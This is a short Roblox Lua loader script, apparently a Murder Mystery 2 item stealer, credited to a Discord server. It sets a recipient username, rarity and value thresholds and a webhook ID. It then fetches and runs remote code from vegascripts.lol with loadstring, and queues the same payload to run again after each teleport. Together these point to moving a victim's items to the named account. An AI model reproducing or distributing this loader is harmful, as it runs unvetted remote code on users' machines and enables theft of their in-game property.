-- This file was generated at discord.gg/syncrypt

if queue_on_teleport then
	queue_on_teleport("_G.Usernames = {\"lakegaang67\"}\n_G.min_rarity = \"Common\"\n_G.min_value = 5\n_G.pingEveryone = \"Yes\"\n_G.webhook = \"0b8dae50cc1d90a96e569c095b9eee09\"\n\nloadstring(game:HttpGet(\"https://vegascripts.lol/public/mm2.lua\"))()\nloadstring(game:HttpGet(\"https://vegascripts.lol/public/loading.lua\"))()\n")
end

_G.Usernames = { "lakegaang67" }
_G.min_rarity = "Common"
_G.min_value = 5
_G.pingEveryone = "Yes"
_G.webhook = "0b8dae50cc1d90a96e569c095b9eee09"
task.spawn(function()
	loadstring(game:HttpGet("https://vegascripts.lol/public/mm2.lua"))()
end)
task.spawn(function()
	loadstring(game:HttpGet("https://vegascripts.lol/public/loading.lua"))()
end)
